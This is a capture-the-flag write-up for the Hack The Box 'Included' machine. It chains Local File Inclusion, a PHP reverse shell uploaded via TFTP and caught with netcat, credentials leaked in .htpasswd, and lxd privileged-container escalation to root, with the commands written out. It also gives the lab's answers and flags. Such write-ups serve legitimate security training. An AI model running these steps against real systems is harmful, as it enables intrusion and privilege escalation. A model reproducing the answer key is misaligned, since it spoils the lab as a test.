# Included (Tier 2)

## <mark style="color:blue;">Description</mark>

* **Tier&#x20;**<mark style="color:green;">**->**</mark> 2
* **Difficult** <mark style="color:green;">**->**</mark> Very Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **Tags&#x20;**<mark style="color:green;">**->**</mark> PHP / Custom Applications / Protocols / Apache / TFTP / LXD / Reconnaissance\
  &#x20;              / Local File Inclusion / Clear Text Credentials / Arbitrary File Upload

<figure><img src="../../.gitbook/assets/image (649).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=2</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started doing an initial scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)

<pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>nmap 10.129.156.215 -p- -Pn --min-rate 2500 -oN scan.txt
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (415).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the first questions

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

> Answer: _**22,6789,8080,8443**_

***

* Then to learn more about the service running on the open port, I did an exhaustive scan

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nmap 10.129.156.215 -p80 -sVC -oN serv_scan.txt
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>

***

* As I found an HTTP service running on port 80, I went to the browser to explore the content being deployed. I found a simple page for a business with anything relevant. What caught my attention was that the URL was retrieving the file of the page with a query, and maybe this could be vulnerable to a Local File Inclusion attack

<figure><img src="../../.gitbook/assets/image (417).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
{% endhint %}

***

* So I tried to change the file name to a route of a file from the system, in this case, the well-known _/etc/password_ file, and noticed it let me see the content of this file, being, in fact, vulnerable to _Local File Inclusion,_ as I thought. Also checking the information from the file, I saw that in the system existed a profile named _tftp,_ which is the default for the TFTP protocol, also giving me the route to the folder where its configuration files should be

<figure><img src="../../.gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about Local File Inclusion and its exploitation, you can go [here](../../web-exploitation/broken-access-control/local-file-inclusion.md)
{% endhint %}

***

* So, to confirm the system was using this protocol, I did a scan on the UDP ports of the system, as this protocol usually works over UD&#x50;_,_ and our previous scan didn't detect the service. With this, I found that the protocol was being used under its default port, the UDP port 69

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap 10.129.156.215 -sU -oN UDP_scan.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>

***

* With this, we answered the first questions

<figure><img src="../../.gitbook/assets/image (419).png" alt=""><figcaption></figcaption></figure>

> Answer: _**tftp**_

***

<figure><img src="../../.gitbook/assets/image (422).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Local File Inclusion**_

***

<figure><img src="../../.gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

> Answer: _**/var/lib/tftpboot/**_

***

* Knowing this, I tried connecting to the protocol and submitting a reverse shell script for _PHP,_ as this protocol doesn't let me list shared files, just download them or upload them. As it didn't give us any error, we closed the connection, assuming the file was on the server

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">tftp 10.129.156.215
<strong>tftp> put PHPshell.php
</strong>tftp> quit
</code></pre>

<figure><img src="../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the TFTP protocol, you can go [here](../../networks/protocols/tftp.md)
{% endhint %}

***

* Then, I set up a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener to be aware of the connection and called the script from the previously found folder where TFTP was storing its files. After hitting the direction, I noticed the page kept loading, and I had successfully caught a shell from the target. Then, I sanitized the terminal to work more comfortably with it

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp 4444
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

***

* As I gained access as the user from the web server, I had to find a way to make lateral movement to another user on the system with less restricted actions. First, I went to explore the default folder for servers  _/var/www/html,_ and looking at the hidden files found the _.htaccess_ and _.htpasswd_ files, which are related to the server configuration and usually store sensitive information

<figure><img src="../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the abuse of exposed _.htaccess_ or _.htpasswd_ files, you can go [here](../../web-exploitation/broken-access-control/exposed-.htaccess-and-.htpasswd-files.md)
{% endhint %}

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

> Answer: _**.htpasswd**_

***

* So, checking the content of the _.htpasswd_ file, I found the credentials for the _mike_ user were being leaked, and after trying to change to this user using them, I successfully logged in. Then, I went to its _/home_ folder where I found a _user.txt_ file, and reading it, retrieved the user flag&#x20;

<figure><img src="../../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (440).png" alt=""><figcaption></figcaption></figure>

***

* I needed to find a way to escalate privileges, so I tried to check the `sudo` permissions for the user, but didn't have any. After checking some information like local running services and special permissions on files, the only relevant thing I found was that the user was part of the _lxd_ group. So, with a little [research](https://canonical.com/lxd), I understood the use of _lxd_ as a tool for creating containers of operating systems. So, I checked if this tool was installed on the system, and it was

<figure><img src="../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (644).png" alt=""><figcaption></figcaption></figure>

> Answer: _**lxd**_

***

* With this information, I searched for possible exploits of this tool and found an interesting [article](https://www.hackingarticles.in/lxd-privilege-escalation/) with a guide to do it. So, following the guide, I got an image for the _Alpine_ operating system and mounted a server to pass it from our machine to the target host. Then, I downloaded it and checked that it was on the target

{% code overflow="wrap" lineNumbers="true" %}
```bash
# On our machine
wget https://github.com/saghul/lxd-alpine-builder/alpine-v3.13-x86_64-20210218_0139.tar.gz
python3 -m http.server 1234

#On the target machine
wget http://10.10.14.117:1234/alpine-v3.13-x86_64-20210218_0139.tar.gz
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (641).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (638).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn the complete process for the privilege escalation abusing _lxd,_ you can go [here](../../penetration-testing/process-stages/post-exploitation/privilege-escalation/linux-privilege-escalation.md#abusing-lxd)
{% endhint %}

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (645).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Alpine**_

***

* After this, I imported the image and created a container using it, specifying high privileges and mounting the filesystem of the target inside it. Then, I started the container to interact with it

{% code overflow="wrap" lineNumbers="true" %}
```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
lxc init alpine pwned -c security.privileged=true
lxc config device add pwned host-root disk source=/ path /mnt recursive=true
lxc start pwned
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (639).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (642).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (646).png" alt=""><figcaption></figcaption></figure>

> Answer: _**security.privileged=true**_

***

* With all this created, I generated a shell from the container having now access as the _root_ user to the complete filesystem. Last, I went to the mount point on the _/mnt/root_ folder where I found a _root.txt_ file, and reading its content, retrieved the root flag

{% code overflow="wrap" lineNumbers="true" %}
```bash
lxc exec pwned /bin/sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (643).png" alt=""><figcaption></figcaption></figure>

***

* With this and the previously found user flag, I answered the last questions

<figure><img src="../../.gitbook/assets/image (647).png" alt=""><figcaption></figcaption></figure>

> Answer: _**/mnt/root/**_

***

<figure><img src="../../.gitbook/assets/image (648).png" alt=""><figcaption></figcaption></figure>

> Answer: _**a56ef91d70cfbf2cdb8f454c006935a1**_

***

* And finally, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**c693d9c7499d9f572ee375d4c14c7bcf**_
